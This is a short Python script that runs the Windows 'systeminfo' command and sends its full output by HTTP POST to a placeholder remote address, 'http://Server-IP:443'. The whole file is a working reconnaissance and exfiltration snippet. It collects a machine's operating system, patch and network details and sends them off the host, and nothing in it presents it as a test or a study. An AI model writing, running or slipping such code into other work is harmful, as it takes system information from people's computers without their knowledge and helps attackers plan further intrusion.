import subprocess
import requests

def run_systeminfo():
    try:
        result = subprocess.check_output('systeminfo', shell=True)
        return result.decode('utf-8')
    except Exception as e:
        return str(e)

def send_results(result, url):
    try:
        requests.post(url, data=result)
        print("Results sent successfully.")
    except Exception as e:
        print("Error sending results:", e)

if __name__ == "__main__":
    system_info = run_systeminfo()
    send_results(system_info, 'http://Server-IP:443')
